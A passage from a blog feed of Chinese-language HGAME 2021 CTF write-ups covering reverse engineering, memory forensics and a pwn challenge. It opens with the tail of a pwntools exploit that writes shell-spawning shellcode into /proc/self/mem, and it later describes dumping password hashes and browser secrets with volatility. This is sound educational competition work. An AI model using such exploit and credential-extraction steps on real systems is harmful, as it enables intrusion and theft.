class="string">&#x27;：&#x27;</span>)</span><br><span class="line">prog_base = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;-&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;prog_base: &quot;</span>+<span class="built_in">hex</span>(prog_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写 shellcode</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(prog_base+<span class="number">0x1652</span>))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;Hgame Pwn题&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="https://www.0wl.site/tags/pwn/"/>
    
    <category term="hgame" scheme="https://www.0wl.site/tags/hgame/"/>
    
  </entry>
  
  <entry>
    <title>HGAME-Week4-Writeup</title>
    <link href="https://www.0wl.site/2021/03/27/HGAME-Week4-Writeup/"/>
    <id>https://www.0wl.site/2021/03/27/HGAME-Week4-Writeup/</id>
    <published>2021-03-27T07:10:15.000Z</published>
    <updated>2021-11-16T14:54:13.031Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>Week4</p></div></article> <span id="more"></span><h2 id="Re">Re</h2><h3 id="1-vm-swig￼5">1.vm<img src="/2021/03/27/HGAME-Week4-Writeup/re1(4).png" class=""></h3><p>​这部分逻辑很清晰，重点在中间这个加密的部分，点进去查看这个函数发现 switch-case 应该是vm，每个case都是一个 opcode</p><p>​题目里说 ovm++ hates debugger ，那就先调试一下，调试后可以猜测出具体的加密部分</p><img src="/2021/03/27/HGAME-Week4-Writeup/re1(2).png" class=""><img src="/2021/03/27/HGAME-Week4-Writeup/re1(3).png" class=""><p>​输入的 flag 先是经过异或加密，之后又有减法操作，加密后与密文进行比较，写脚本解一下就能得到 flag</p><img src="/2021/03/27/HGAME-Week4-Writeup/re1.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">0xcf</span>,<span class="number">0xbf</span>,<span class="number">0x80</span>,<span class="number">0x3b</span>,<span class="number">0xf6</span>,<span class="number">0xaf</span>,<span class="number">0x7e</span>,<span class="number">0x02</span>,<span class="number">0x24</span>,<span class="number">0xed</span>,<span class="number">0x70</span>,<span class="number">0x3a</span>,<span class="number">0xf4</span>,<span class="number">0xeb</span>,<span class="number">0x7a</span>,<span class="number">0x4a</span>,<span class="number">0xe7</span>,<span class="number">0xf7</span>,<span class="number">0xa2</span>,<span class="number">0x67</span>,<span class="number">0x17</span>,<span class="number">0xf0</span>,<span class="number">0xc6</span>,<span class="number">0x76</span>,<span class="number">0x36</span>,<span class="number">0xe8</span>,<span class="number">0xad</span>,<span class="number">0x82</span>,<span class="number">0x2e</span>,<span class="number">0xdb</span>,<span class="number">0xb7</span>,<span class="number">0x4f</span>,<span class="number">0xe6</span>,<span class="number">0x09</span>]</span><br><span class="line">table1 = [<span class="number">0xFE</span>,<span class="number">0x21</span>,<span class="number">0x44</span>,<span class="number">0x67</span>,<span class="number">0x8A</span>,<span class="number">0xAD</span>,<span class="number">0xD0</span>,<span class="number">0xF3</span>,<span class="number">0x16</span>,<span class="number">0x39</span>,<span class="number">0x5c</span>,<span class="number">0x7f</span>,<span class="number">0xa2</span>,<span class="number">0xc5</span>,<span class="number">0xe8</span>,<span class="number">0x0b</span>,<span class="number">0x2e</span>,<span class="number">0x51</span>,<span class="number">0x74</span>,<span class="number">0x97</span>,<span class="number">0xba</span>,<span class="number">0xdd</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x46</span>,<span class="number">0x69</span>,<span class="number">0x8c</span>,<span class="number">0xaf</span>,<span class="number">0xd2</span>,<span class="number">0xf5</span>,<span class="number">0x18</span>,<span class="number">0x3b</span>,<span class="number">0x5e</span>,<span class="number">0x81</span>]</span><br><span class="line">table2 = [<span class="number">0x7a</span>,<span class="number">0x1a</span>,<span class="number">0xba</span>,<span class="number">0x5a</span>,<span class="number">0xfa</span>,<span class="number">0x9a</span>,<span class="number">0x3a</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x1a</span>,<span class="number">0xba</span>,<span class="number">0x5a</span>,<span class="number">0xfa</span>,<span class="number">0x9a</span>,<span class="number">0x3a</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x1a</span>,<span class="number">0xba</span>,<span class="number">0x5a</span>,<span class="number">0xfa</span>,<span class="number">0x9a</span>,<span class="number">0x3a</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x1a</span>,<span class="number">0xba</span>,<span class="number">0x5a</span>,<span class="number">0xfa</span>,<span class="number">0x9a</span>,<span class="number">0x3a</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x1a</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">  <span class="keyword">if</span> cipher[i] + table2[<span class="number">33</span>-i] &lt; <span class="number">256</span>:</span><br><span class="line">    cipher[i] += table2[<span class="number">33</span>-i]</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    cipher[i] = cipher[i] + table2[<span class="number">33</span>-i] - <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">  cipher[i] ^= table1[<span class="number">33</span>-i]</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">chr</span>(cipher[i]),end = <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>​这道题标准解法应该不是这样解的，而是要先要翻译出对应的汇编代码再分析，但这部分我还不太明白之后再补上吧</p><h3 id="2-A-5-Second-Challenge">2.A 5 Second Challenge</h3><p>​这题要感谢小圆学长的耐心回答!!</p><p>​下载得到的是用unity制作的扫雷游戏，刚开始为了获得源码用 il2cppdumper 处理 GameAssembly.dll ，但发现处理后得到的不全，之后问了一下小圆学长发现源码已经给了。</p><img src="/2021/03/27/HGAME-Week4-Writeup/re2.png" class=""><p>​打开 AFiveSecondChallenge.cpp ，源码里有 getUnixtime 这类获取时间的函数，游戏时间超过 5s 就会显示超时，用锁住系统时间的软件可以避开这一检测。锁定时间后就可以开始玩扫雷，几局下来后会发现雷的位置能构成二维码</p><img src="/2021/03/27/HGAME-Week4-Writeup/re2(2).png" class=""><p>​根据题目提示，把 managed 文件夹下的 dll 拖到 ida 里，会发现有一个函数被nop掉了，定位到源码里查看（il2cpp的中间文件有些混乱，删除了影响判断的部分）</p><img src="/2021/03/27/HGAME-Week4-Writeup/re2(3).png" class=""><p>​这里的 return <strong>判断是否是雷的位置</strong>，本来分析到这里已经很清楚了但是因为我完全不懂类和方法什么的看了挺久</p><img src="/2021/03/27/HGAME-Week4-Writeup/re2(4).png" class=""><p>​GetAt函数的返回值没在源码里看到有初始赋值于是迷惑了好久，又去问了一下小圆学长这部分是在哪里初始化过，得到回复说是在那个 dll 里面。</p><p>​但是我在我下载的东西里面没发现 m_Items 初始化的部分，去网站上重新下载并拖到 ilspy ，得到了这个数组里的值</p><img src="/2021/03/27/HGAME-Week4-Writeup/re2(5).png" class=""><p>​接下来就是写脚本解题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> matrix[<span class="number">45</span>][<span class="number">15</span>][<span class="number">3</span>] = ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">GetAt</span><span class="params">(i, j, k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iBound = <span class="number">45</span>;<span class="comment">//45</span></span><br><span class="line">  <span class="keyword">int</span> jBound = <span class="number">15</span>;<span class="comment">//15</span></span><br><span class="line">  <span class="keyword">int</span> kBound = <span class="number">3</span>;<span class="comment">//3</span></span><br><span class="line">  <span class="keyword">return</span> matrix[i][j][k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y,x;</span><br><span class="line">  FILE* fp;</span><br><span class="line">  fp = fopen(<span class="string">&quot;************&quot;</span> , <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">int</span> a[<span class="number">45</span>][<span class="number">45</span>];</span><br><span class="line">  <span class="keyword">int</span> i, j;</span><br><span class="line">  <span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; <span class="number">45</span>; y++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; <span class="number">45</span>; x++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">double</span> L_8 = GetAt(y, x / <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">double</span> L_14 = GetAt(y, x / <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">double</span> V_0 = L_14;</span><br><span class="line">      <span class="keyword">double</span> L_20 = GetAt(y, x / <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">double</span> V_1 = L_20;</span><br><span class="line">      <span class="keyword">double</span> V_2 = <span class="built_in">fmod</span>(x, <span class="number">3.0f</span>) - <span class="number">1.0f</span>;</span><br><span class="line">      a[x][y] = L_8* V_2* V_2 + V_0 * V_2 + V_1 &gt; <span class="number">0.0</span> ? <span class="number">1</span> : <span class="number">0</span>;<span class="comment">//1是雷</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a[j][i]);</span><br><span class="line">      <span class="keyword">if</span> (a[j][i] == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">&quot;%d,%d\n&quot;</span>, j, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(fp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x,y = np.loadtxt(<span class="string">&#x27;./xy.txt&#x27;</span>,delimiter=<span class="string">&#x27;,&#x27;</span>,unpack=<span class="literal">True</span>)</span><br><span class="line">plt.plot(x,y,<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><img src="/2021/03/27/HGAME-Week4-Writeup/re2(6).png" class=""><h3 id="3-nllvm">3.nllvm</h3><p>​拖到 ida 里发现挺乱的，也没看到控制台输出的那些文字，那就先调试看看</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3(5).png" class=""><p>​调试后发现这些异或操作得到的就是控制台输出的字符，在输出后又来了一遍异或还原。</p><p>​接着调试发现判断输入字符串的地方</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3(4).png" class=""><p>​这一部分异或得到 <strong>“CryptoFAILUREforRSA2048Key!!!”</strong>  这个字符串，接着来到加密的函数</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3(3).png" class=""><p>​传入的就是这部分异或得到字符串和输入的 flag，之后看了一下这个函数里面是一些比较复杂的运算猜测是某种算法，我对各种算法不是很熟所以用了 ida 插件 findcrypt ，但是这个插件并没有找到什么算法于是我就去找学长确认了一下</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3(9).png" class=""><p>​查了各种算法，最后发现加密函数里面的一个函数像是<strong>s盒</strong>，根据s盒数字判断又是 <strong>AES 加密</strong>  ( s盒也是异或得到的，这大概是插件检测不出算法的原因 )</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3(2).png" class=""><p>​在调试过程中可以知道 <strong>iv值是 123456789abcdef</strong> ，判断是否为正确 flag 的部分与密文进行比较，改变了输出字符的外观（表示是否回到现实）</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3(6).png" class=""><p>​之后用我在week2写的脚本解就行</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3.png" class=""><p>​查了一下题目里的 llvm ，是一款代码混淆器，具体的是看了这篇文章https://bbs.pediy.com/thread-224484.htm</p><h2 id="Misc">Misc</h2><h3 id="1-Akira之瞳-1">1.Akira之瞳-1</h3><p>​查资料知道这种 dump 出来的RAW 文件要在 linux 里用 <strong>volatility</strong> 看，先查一下系统版本</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc1(6).png" class=""><p>​接着用 pslist 查看一下系统进程，找到可疑的进程后 dump 出来</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc1(5).png" class=""><p>​用 foremost 分离出一个加密的压缩包，本来以为密码还在 raw 文件里面的某个文件里来回看了好多遍，之后用 010editor 打开压缩包后发现提示，zip 密码是<strong>系统登陆密码</strong></p><img src="/2021/03/27/HGAME-Week4-Writeup/misc1(3).png" class=""><p>​hashdump 一下得到登陆密码的 hash 值</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc1(4).jpg" class=""><p>​按提示把密码解出来</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc1.png" class=""><img src="/2021/03/27/HGAME-Week4-Writeup/misc1(2).png" class=""><p>​打开压缩包后发现两张图片，名字是src 和 blind，很容易就想到<strong>盲水印</strong>，用这个工具 (<a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a>) 提取出水印</p><img src="/2021/03/27/HGAME-Week4-Writeup/flag.png" class=""><p>​图片里小写的 L 是数字1</p><h3 id="2-Akira之瞳-2">2.Akira之瞳-2</h3><p>​得到一个加密压缩包和 RAW 文件，同样先查看一下进程，发现 notepad进程 dump出来</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(5).png" class=""><p>​在 dump 出来的进程里查一下 password 字符串，得到 zip 密码</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(6).png" class=""><p>​打开压缩包得到</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2.png" class=""><p>​这几个文件名好像在哪里见过，翻了一下往年的 writeup 知道container 是<strong>加密容器</strong>，cookies 是chrome浏览器的 <strong>cookie 数据库</strong>。但是看 cookies 文件内容和打开加密卷都需要密码，回到 linux 里再查一下有无密码，因为是 notepad 进程那就查 <strong>txt 文件</strong></p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(8).png" class=""><p>​这个 <strong>dumpme.txt</strong> 很可疑，提取出来发现之前 zip 密码还有后半句。百度一下知道 lastpass 是 chrome 浏览器的插件，用来记录密码的，把 lastpass 和 dump 放在一起搜索找到 volatility 里有 lastpass 这个插件</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(7).png" class=""><p>​得到一个密码，下载 <strong>ChromeCookiesView</strong> ，加载 cookies 文件并输入密码，得到加密容器密码并提示用 <strong>VeraCrypt</strong> 打开</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(2).png" class=""><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(3).png" class=""><p>​打开虚拟分区得到一张图片，查 ADS 得知 NTFS 隐写</p><blockquote><p>​NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。</p></blockquote><p>​然后用 <strong>Ntfs Streams Editor</strong> 这个软件查看 ADS 流文件，得到 flag</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(4).png" class=""><p>​那个网址里的图是 Akira 学长的新头像</p><h2 id="总结">总结</h2><p>​为时四周的 hgme 要结束了，这个寒假学到了很多东西过得很充实，希望以后能继续学习这方面的知识，不断进步</p>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;Week4&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    <category term="Hgame2021" scheme="https://www.0wl.site/categories/Hgame2021/"/>
    
    
    <category term="hgame" scheme="https://www.0wl.site/tags/hgame/"/>
    
  </entry>
  
  <entry>
    <title>HGAME-Week3-Writeup</title>
    <link href="https://www.0wl.site/2021/03/27/HGAME-Week3-Writeup/"/>
    <id>https://www.0wl.site/2021/03/27/HGAME-Week3-Writeup/</id>
    <published>2021-03-27T07:01:21.000Z</published>
    <updated>2021-11-16T14:53:56.207Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>Week3</p></div></article> <span id="more"></span><h2 id="Re">Re</h2><h3 id="1-FAKE">1.FAKE</h3><p>​拖到ida</p><img src="/2021/03/27/HGAME-Week3-Writeup/re1(5).png" class=""><p>​关键函数里有36个方程，36个变量，那就不可能普通的解出来，</p><p>​查找字符串得到提示 <strong>Try angr or z3</strong>，我用的是 z3库，脚本太长了就不放了（用z3库解的时候一直跑不出结果，就去问了 r3n0学长，学长说可能需要点时间，但之后我重新弄了一下add的部分很快就跑出来了，应该是我自己中间操作上的问题…）</p><img src="/2021/03/27/HGAME-Week3-Writeup/re1(3).png" class=""><p>​假flag，查一下<strong>SMC</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">SMC</span><span class="params">(self-Modifying Code)</span></span>，就是在真正执行某一段代码时，程序会对自身的该段代码进行自修改，只有在修改后的代码才是可汇编，可执行的。在程序未对该段代码进行修改之前，在静态分析状态下，均是不可读的字节码，IDA之类的反汇编器无法识别程序的正常逻辑。是一种反调试代码技术。</span><br></pre></td></tr></table></figure><p>​在ida里找一下smc自解密的部分</p><img src="/2021/03/27/HGAME-Week3-Writeup/re1(2).png" class=""><p>​这段代码执行后才得到真正的代码，写 idc 脚本来解密 ida 反编译后错误的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x00401216</span>;<span class="comment">//函数地址  </span></span><br><span class="line">    <span class="keyword">auto</span> addr2 = <span class="number">0x00409080</span>;  <span class="comment">//byte数组地址</span></span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">0x43E</span>;i++)   </span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^Byte(addr2+i));  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​得到运行过程中真正的代码</p><img src="/2021/03/27/HGAME-Week3-Writeup/re1(4).png" class=""><p>​这部分继续用z3库写脚本去解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">a1 = [<span class="number">0</span>] * <span class="number">36</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    a1[i] = Int(<span class="string">&#x27;a1[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">v3 = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">v2 = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">v4 = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">v3[<span class="number">0</span>] = <span class="number">55030</span></span><br><span class="line">v3[<span class="number">1</span>] = <span class="number">61095</span></span><br><span class="line">v3[<span class="number">2</span>] = <span class="number">60151</span></span><br><span class="line">v3[<span class="number">3</span>] = <span class="number">57247</span></span><br><span class="line">v3[<span class="number">4</span>] = <span class="number">56780</span></span><br><span class="line">v3[<span class="number">5</span>] = <span class="number">55726</span></span><br><span class="line">v3[<span class="number">6</span>] = <span class="number">46642</span></span><br><span class="line">v3[<span class="number">7</span>] = <span class="number">52931</span></span><br><span class="line">v3[<span class="number">8</span>] = <span class="number">53580</span></span><br><span class="line">v3[<span class="number">9</span>] = <span class="number">50437</span></span><br><span class="line">v3[<span class="number">10</span>] = <span class="number">50062</span></span><br><span class="line">v3[<span class="number">11</span>] = <span class="number">44186</span></span><br><span class="line">v3[<span class="number">12</span>] = <span class="number">44909</span></span><br><span class="line">v3[<span class="number">13</span>] = <span class="number">46490</span></span><br><span class="line">v3[<span class="number">14</span>] = <span class="number">46024</span></span><br><span class="line">v3[<span class="number">15</span>] = <span class="number">44347</span></span><br><span class="line">v3[<span class="number">16</span>] = <span class="number">43850</span></span><br><span class="line">v3[<span class="number">17</span>] = <span class="number">44368</span></span><br><span class="line">v3[<span class="number">18</span>] = <span class="number">54990</span></span><br><span class="line">v3[<span class="number">19</span>] = <span class="number">61884</span></span><br><span class="line">v3[<span class="number">20</span>] = <span class="number">61202</span></span><br><span class="line">v3[<span class="number">21</span>] = <span class="number">58139</span></span><br><span class="line">v3[<span class="number">22</span>] = <span class="number">57730</span></span><br><span class="line">v3[<span class="number">23</span>] = <span class="number">54964</span></span><br><span class="line">v3[<span class="number">24</span>] = <span class="number">48849</span></span><br><span class="line">v3[<span class="number">25</span>] = <span class="number">51026</span></span><br><span class="line">v3[<span class="number">26</span>] = <span class="number">49629</span></span><br><span class="line">v3[<span class="number">27</span>] = <span class="number">48219</span></span><br><span class="line">v3[<span class="number">28</span>] = <span class="number">47904</span></span><br><span class="line">v3[<span class="number">29</span>] = <span class="number">50823</span></span><br><span class="line">v3[<span class="number">30</span>] = <span class="number">46596</span></span><br><span class="line">v3[<span class="number">31</span>] = <span class="number">50517</span></span><br><span class="line">v3[<span class="number">32</span>] = <span class="number">48421</span></span><br><span class="line">v3[<span class="number">33</span>] = <span class="number">46143</span></span><br><span class="line">v3[<span class="number">34</span>] = <span class="number">46102</span></span><br><span class="line">v3[<span class="number">35</span>] = <span class="number">46744</span></span><br><span class="line">v2[<span class="number">0</span>] = <span class="number">104</span></span><br><span class="line">v2[<span class="number">1</span>] = <span class="number">103</span></span><br><span class="line">v2[<span class="number">2</span>] = <span class="number">97</span></span><br><span class="line">v2[<span class="number">3</span>] = <span class="number">109</span></span><br><span class="line">v2[<span class="number">4</span>] = <span class="number">101</span></span><br><span class="line">v2[<span class="number">5</span>] = <span class="number">123</span></span><br><span class="line">v2[<span class="number">6</span>] = <span class="number">64</span></span><br><span class="line">v2[<span class="number">7</span>] = <span class="number">95</span></span><br><span class="line">v2[<span class="number">8</span>] = <span class="number">70</span></span><br><span class="line">v2[<span class="number">9</span>] = <span class="number">65</span></span><br><span class="line">v2[<span class="number">10</span>] = <span class="number">75</span></span><br><span class="line">v2[<span class="number">11</span>] = <span class="number">69</span></span><br><span class="line">v2[<span class="number">12</span>] = <span class="number">95</span></span><br><span class="line">v2[<span class="number">13</span>] = <span class="number">102</span></span><br><span class="line">v2[<span class="number">14</span>] = <span class="number">108</span></span><br><span class="line">v2[<span class="number">15</span>] = <span class="number">97</span></span><br><span class="line">v2[<span class="number">16</span>] = <span class="number">103</span></span><br><span class="line">v2[<span class="number">17</span>] = <span class="number">33</span></span><br><span class="line">v2[<span class="number">18</span>] = <span class="number">45</span></span><br><span 